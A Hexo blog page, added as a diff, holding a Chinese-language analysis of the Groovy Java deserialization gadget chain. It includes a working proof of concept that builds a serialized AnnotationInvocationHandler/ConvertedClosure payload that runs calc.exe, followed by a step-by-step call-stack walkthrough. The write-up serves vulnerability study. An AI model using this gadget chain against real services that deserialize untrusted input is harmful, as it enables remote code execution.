@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Groovy反序列化利用链分析 在分析CC一系列利用链时发现有好几条链是利用jdk1.7的AnnotationInvocationHandler的反序列化复写点，该漏洞也用到了这个点，而且该漏洞也会用到java动态代理，cc3分析文章中只是解释了动态代理的实现，但是没有具体实例，不便于理解，所以此次会用一个demo解释一下该漏洞分析中需要用到的动态代理相关知识。 动态代理代码中定义了一个被代理接口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Groovy反序列化利用链分析 在分析CC一系列利用链时发现有好几条链是利用jdk1.7的AnnotationInvocationHandler的反序列化复写点，该漏洞也用到了这个点，而且该漏洞也会用到java动态代理，cc3分析文章中只是解释了动态代理的实现，但是没有具体实例，不便于理解，所以此次会用一个demo解释一下该漏洞分析中需要用到的动态代理相关知识。 动态代理代码中定义了一个被代理接口">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624502127199.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624503552767.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624433198594.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624433589178.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624434400118.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505062947.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505203024.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505665322.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624514610308.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624515178076.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624516850625.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624518111276.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624518318587.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624524615674.png">
+<meta property="og:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624524582500.png">
+<meta property="article:published_time" content="2021-06-25T10:17:03.955Z">
+<meta property="article:modified_time" content="2021-06-25T10:18:36.479Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624502127199.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Groovy反序列化利用链分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2021-06-25T10:17:03.955Z" itemprop="datePublished">2021-06-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Groovy反序列化利用链分析"><a href="#Groovy反序列化利用链分析" class="headerlink" title="Groovy反序列化利用链分析"></a>Groovy反序列化利用链分析</h1><p> 在分析CC一系列利用链时发现有好几条链是利用jdk1.7的<code>AnnotationInvocationHandler</code>的反序列化复写点，该漏洞也用到了这个点，而且该漏洞也会用到java动态代理，cc3分析文章中只是解释了动态代理的实现，但是没有具体实例，不便于理解，所以此次会用一个demo解释一下该漏洞分析中需要用到的动态代理相关知识。</p>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>代码中定义了一个被代理接口<code>Hello</code>，该接口中有<code>morning</code>方法。</p>
+<p>创建了一个<code>InvocationHandler</code>实例，该实例中定义了<code>invoke</code>方法</p>
+<p>然后通过<code>Proxy.newProxyInstance</code>方法生成了一个动态代理类<code>$Proxy0</code>，该方法中传入3个参数，<code>Classloader</code>、<code>要实现的接口</code>，<code>处理调用方法的InvocationHandler</code></p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624502127199.png" alt="1624502127199"></p>
+<p>当调用<code>hello.morning</code>会调用<code>super.h.invoke</code>方法，<code>h</code>就是<code>InvocationHandler</code>实例,所以最终会调用<code>InvocationHandler</code>实例的<code>invoke</code>方法。</p>
+<p>生成的代理类<code>$Proxy0</code>如下</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624503552767.png" alt="1624503552767"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">M_Groovy1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MethodClosure closure = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;calc.exe&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        InvocationHandler convertedclosure = <span class="keyword">new</span> ConvertedClosure(closure,<span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line">        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,convertedclosure);</span><br><span class="line"><span class="comment">//        proxymap.entrySet().iterator();</span></span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class,proxymap);</span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先还是看下调用栈，在<code>AnnotationInvocationHandle#readObject</code>方法中调用了<code>entrySet</code>方法，然后调用到了<code>ConversionHandler#invoke</code>，看到这里好像有一点熟悉的味道，和CC3比较像，不同的是CC3调用的是<code>AnnotationInvocationHandler#invoke</code>。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624433198594.png" alt="1624433198594"></p>
+<p>这里还是利用里动态代理的相关知识</p>
+<p>如果<code>this.memberValues</code>是<code>map</code>的代理类，那么调用<code>entrySet</code>方法会调用到<code>invocationHandler</code>的<code>invoke</code>方法上</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624433589178.png" alt="1624433589178"></p>
+<p>通过调用栈可以看到调用了<code>ConversionHandler#invoke</code>，所以需要构造<code>map</code>的动态代理类是<code>ConversionHandler</code>类或者其子类。</p>
+<p><code>ConversionHandler#invoke</code>中会调用<code>invokeCustom</code>方法，传入的参数分别是动态代理对象、被代理方法也即是entrySet、entrySet方法的参数</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624434400118.png" alt="1624434400118"></p>
+<p><code>invokeCustom</code>中会调用<code>this.getDelegate().call</code>方法</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505062947.png" alt="1624505062947"></p>
+<p><code>this.getDelegate()</code>方法返回<code>delegate</code>属性，该属性是在构造方法中赋值的。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505203024.png" alt="1624505203024"></p>
+<p>然后调用到了<code>Closure#call</code>,所以<code>delegate</code>属性是一个<code>Closure</code>或者其子类的对象，此处是一个<code>MethodClosure</code>的对象。该方法中先通过<code>getMetaClass</code>方法得到一个<code>MetaClassImpl</code>的实例，然后调用该实例的<code>invokeMethd</code>方法，传入了当前对象的引用<code>this</code>。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624505665322.png" alt="1624505665322"></p>
+<p><code>invokeMethd</code>方法中要求object（也就是上个函数中传如的this引用）必须是<code>MethodCloSure</code>的实例，才可以</p>
+<p>调用到<code>ownerMetaClass.invokeMethod</code>可以看到传入的参数<code>methodName</code>是<code>execute</code>、<code>owner</code>是<code>calc.exe</code>，</p>
+<p><code>ownerMetaClass</code>是通过<code>owner</code>的类型获取的另一个<code>MetaClassImpl</code>的实例</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624514610308.png" alt="1624514610308"></p>
+<p><code>methodName</code>参数是通过<code>mc.getMethod()</code>得到的method属性，owner参数是closure.getOwner()获取的，由于<code>MethodCloSure</code>继承自<code>closure</code>，这两个参数都是在<code>MethodCloSure</code>的构造方法中赋值。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624515178076.png" alt="1624515178076"></p>
+<p>继续跟进<code>MetaClassImpl#invokeMethod</code>，先通过<code>methodName</code>参数获取了一个<code>Method</code>，可以看待此时<code>Method</code>是一个<code>dgm$748</code>的实例由于此时的参数<code>object</code>是<code>calc.exe</code>这个字符串，所以直接会调用<code>method.doMethodInvoke</code>方法。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624516850625.png" alt="1624516850625"></p>
+<p><code>dgm$748#doMethodInvoke</code>中会调用<code>processGrroyMethods.execute</code>方法，传入的第一个参数就是<code>calc.exe</code></p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624518111276.png" alt="1624518111276"></p>
+<p><code>processGrroyMethods#execute</code>会调用<code>Runtime.getRuntime().exec()</code>执行命令<code>calc.exe</code>命令。</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624518318587.png" alt="1624518318587"></p>
+<p>由以上分析可知，当构造好一个<code>MethodCloSure</code>的实例，当调用该实例的call方法时最终会调用对应的org.codehaus.groovy.runtime下的对应dgm类的<code>doMethodInvoke</code>方法，如下所示</p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624524615674.png" alt="1624524615674"></p>
+<p><img src="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1624524582500.png" alt="1624524582500"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体步骤，分为如下几步</p>
+<ul>
+<li>构造好一个<code>MethodCloSure</code>实例，<code>owner</code>属性是<code>calc.exe</code>,<code>method</code>属性是<code>execute</code></li>
+<li>构造好一个<code>ConvertedClosure</code>实例，该类的<code>delegate</code>属性是第一步构造好的<code>MethodCloSure</code>实例，<code>method</code>属性是<code>entrySet</code></li>
+<li>将<code>ConvertedClosure</code>实例作为handler生成一个map的代理类</li>
+<li>构造好<code>AnnotationInvocationHandler</code>实例，该类的<code>memberValue</code>属性是构造好的代理类</li>
+</ul>
+<p>当<code>AnnotationInvocationHandler</code>反序列化时会调用<code>ConvertedClosure#invokeCustom</code>，<code>ConvertedClosure#invokeCustom</code>中会调用<code>MethodCloSure#call</code>导致执行了构造的恶意命令。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckqc6md050000fwvj0x2qg77t" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/06/21/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE3%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/06/25/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/21/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE3%E5%88%86%E6%9E%90/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/21/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE3%E5%88%86%E6%9E%90/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE3%E5%88%86%E6%9E%90/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
